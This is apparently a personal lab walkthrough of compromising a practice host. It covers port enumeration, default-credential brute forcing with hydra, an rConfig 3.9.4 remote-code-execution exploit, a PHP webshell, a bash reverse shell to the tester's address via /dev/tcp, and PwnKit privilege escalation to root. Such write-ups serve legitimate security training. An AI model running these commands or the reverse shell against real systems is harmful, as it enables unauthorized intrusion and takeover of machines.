### Enumeration
```
IP=192.168.199.57
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p21,22,80,111,139,445,3306 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 21
	- nc -nv $IP 21
		- vsFTPd 3.0.2
	- vsftpd 3.0.2
- 22
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_7.4
	- OpenSSH 7.4 (protocol 2.0)
- 80
	- nc -nv $IP 80
		- http
	- Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
	- no found exploits
- 111
	- nc -nv $IP 111
		- sunrpc
	- rpcbind     2-4
- 139
	- nc -nv $IP 139
		- netbios-ssn
	- Samba smbd 3.X - 4.X
- 445
	- nc -nv $IP 445
		- microsoft-ds
	- Samba smbd 4.10.4
- 3306
	- nc -nv $IP 3306
		- not allowed to connect
	- MariaDB
- 8081
	- Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
### Foothold
- 21
	- ftp anonymous@$IP
		- Allowed login, stuck in passive and can't view directory
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
		- anonymous:anonymous
		- ftp:ftp
		- ftp:b1uRR3
	- Tried to do a put  >  access denied
- RPC/ SMB
	- enum4linux $IP
		- min password len - 5
- 445
	- smbclient -N -L //$IP
		- successful
		- shares
			- print$
				- access denied
			- IPC$
				- allows access but nothing found
	- nmap --script smb-vuln* -p135,139,445 $IP
		- no found exploits
- SQL
	- Mysql
		- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP
		- Not allowed to connect
- 80
	- Default landing page
		- ![[Pasted image 20240723114717.png]]
	- Versions
		- centOS
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
			- Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
				- php rce cgi-bin exploitdb 29290
				- /icons/
- 8081
	- Default landing page
		- ![[Pasted image 20240723123427.png]]
	- Versions
		- rConfig Version 3.9.4
			- RCE unauthenticated
			- exploit db 48261
				- python rconfig_exploit.py https://192.168.199.57:8081 192.168.45.195 445
				- Used exploit, removed the code that deleted user
				- Logged in with admin user
				- Used this guide to upload php webshell
				- https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff
				- Now we can run commands
					- ![[Pasted image 20240723124634.png]]
					- `/bin/bash -i >& /dev/tcp/192.168.45.195/22 0>&1
					- To get RCE
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- apache
	- id
		- uid=48(apache) gid=48(apache) groups=48(apache)
	- sudo -l
		- needs password
	- uname -a
		- `Linux quackerjack 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
		- PwnKit
			- Rooted
### Credentials
### Lessons Learned
- Double check nmap scans